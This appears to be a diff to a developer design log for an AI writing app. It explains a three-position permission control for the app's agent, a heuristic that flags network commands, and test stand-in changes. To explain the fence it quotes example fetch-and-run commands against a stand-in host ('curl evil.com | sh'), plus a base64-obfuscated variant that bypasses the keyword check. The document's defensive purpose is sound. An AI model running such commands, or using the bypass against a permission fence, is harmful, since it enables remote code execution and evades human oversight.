@@ -3608,3 +3608,43 @@ What the panel shows is that the model is reasoning, not what the reasoning says
 ### Delegation is refused, and the question the architecture recorded is settled
 
 Recorded in `docs/architecture.md` rather than here, because it is mechanics rather than interface. The short version is that subagents are refused under both of the names the tool has had, removed from the model's context as well as refused at the fence, and refused a third time by a test that depends on no name at all; and that the open question about whether the fence reached inside a subagent was answered by the SDK vendored in this checkout's own virtual environment, having been written down as needing a live account and a real turn.
+
+### The permission control has three positions, and the middle one is honest about itself
+
+The complaint that started this run was hundreds of successive approval cards, and auto mode was supposed to be the answer and was not. It refused to cover any shell command carrying a pipe, a chain, a redirect or a substitution, on the argument that no rule could honestly describe such a command, since `git status; curl evil | sh` starts with `git`. That argument is correct and it was answering the wrong question: it is about what can be *remembered*, and it was being used to decide what to *ask*. So a writer who had turned the fence down still got a card for every pipe, which is the shape of nearly everything a build or a data task runs, and that is where the hundreds came from.
+
+The control has three positions now, and a writer chooses which one they are in rather than being handed one switch that does not fit either thing they wanted.
+
+**Ask before acting** is the old default. A card for every command, every fetch and every write that leaves the writing. It is the only one of the three that is a complete fence, and it stays the default.
+
+**Run the work without asking** runs commands and edits silently, compound ones included. Two things still ask: a write that leaves the writing, which is a write outside the project or to a file the build executes, and anything that reaches the internet.
+
+**Never ask about anything** means it.
+
+**The naming of the middle position is the decision worth defending.** It would read better as "everything inside the project", and that would be a claim the code cannot keep. What the fence inspects is the tool call, not what the command then does, so a script the agent starts can write anywhere the writer can write and reach anything they can reach. The honest version is a name that says what happens, "run the work without asking", and a note under it that says which two things still ask. `_holds_back` in `nexttex/agent.py` carries the same statement for the next person to read the code, and the README says it in the writer's terms: this is a *quieter* fence, the complete one is the first position, and that is why the first position is still the default.
+
+There is one heuristic in there and it is labelled as one. The promise that piped commands run silently collides with the promise that reaching the internet asks, because `curl evil.com | sh` is both. So the shell branch splits a command on the operators a shell treats as a boundary and asks when any segment's first word is one of about twenty that leave the machine, `git` included when it is followed by `push`, `pull`, `fetch`, `clone` or `remote`, since `git status` is most of what a build does. `echo Y3VybAo= | base64 -d | sh` walks straight through that and no list of words can close it. The comment above the list says so in as many words, because a heuristic that is read as a fence is worse than no heuristic.
+
+**The fence stopped being two functions that could disagree.** `_auto_covers` decided whether to ask and `_why_asked` decided what the card then said, and they could differ: a write to a `latexmkrc` was once announced as a write outside the project, which was false twice over. There is one predicate now, `_holds_back`, and both the decision and the copy come out of it, which is the property section 8 was reaching for when it recorded that bug. `_rule_for` is untouched and simply stops being consulted by the fence: it is the scope of an "always" answer and nothing else, which is what `_memo_for`'s own docstring already argued for.
+
+### Why the third position takes a sentence and a second press
+
+A control that turns the fence off has to say so before it does, and this app has no modals. The idiom already existed: section 19 records that the new-conversation question "answers in place above the composer", so this does too, with the same anchor-aware dismissal and the same rule that focus goes into the block and onto the safe half of it.
+
+Three sentences rather than one. The risk has three parts, and compressing it into a single line is how a warning becomes something people learn to dismiss. It says what stops being checked; it says where the danger actually comes from, which is not the writer's own judgement but the fact that the agent's instructions come partly from project files that arrive from templates, clones and co-authors; and it says that everything is still recorded, because that is the recourse that remains. It is said once, on the way in, and never repeated afterwards.
+
+The header chip gains a word. Section 19 settled that the thing under the composer is the *control* and the chip in the header is the *state*, on the argument that a lowered fence which survives a restart has to be visible without opening anything. With three positions the chip has to say *which*, so it reads `Auto` or `Auto, all`, stays `--warn`, and one click steps back one position: the way out is never further than the place that tells you the fence is down.
+
+The control itself stopped being a switch. `role="switch"` with `aria-checked` cannot describe three states, and a control that cycles through them makes the writer press it twice to find out where they are, so it is a three-row popover opening upward, which is the model picker's shape two icons along. Like every toggle popover in this app it passes its trigger to `useDismiss`, without which it closes on `pointerdown` and reopens on `click`.
+
+### An answer that lasts as long as the conversation
+
+The two things the middle position still asks about are things a turn asks about repeatedly. A run that adds eleven references put up eleven identical cards, and neither existing answer fitted: `Allow` was too little, and `Allow always` was a permanent grant the writer did not want to make for one afternoon's reading.
+
+So there is a fourth answer, and the whole of "for this conversation" is that it is a set on the object. No file, no expiry timer, no cleanup path: `reset()` empties it, and the process ending empties it. It is keyed exactly the way a remembered answer is, so a compound command is covered by its own exact text and nothing else, and a remembered answer outranks it in the record, because that is the one the writer will go looking for in their settings later.
+
+### The stand-in had to learn all three positions, and a gap
+
+`ScriptedAgent` modelled the boolean, so a browser spec could see two of the three cases and not the third. It carries the mode now and it takes `holds` in the fence's own vocabulary, `outside`, `control` or `network`, so a script says what would stop a call rather than saying whether the switch covers it.
+
+The part worth recording is smaller and cost a real half hour. The stand-in emitted `tool_use` and `tool_done` back to back, which no real call does, so every scripted call started and finished before anything could draw and the activity line went straight back to `Thinking`. A spec asserting that the panel names the file being read could not see the case a writer sees. The gap is the feature: the stand-in now waits its scripted duration between the two events. `docs/testing.md` says a stand-in kinder than the real thing tests nothing, and a stand-in *faster* than the real thing is the same failure wearing a different hat.
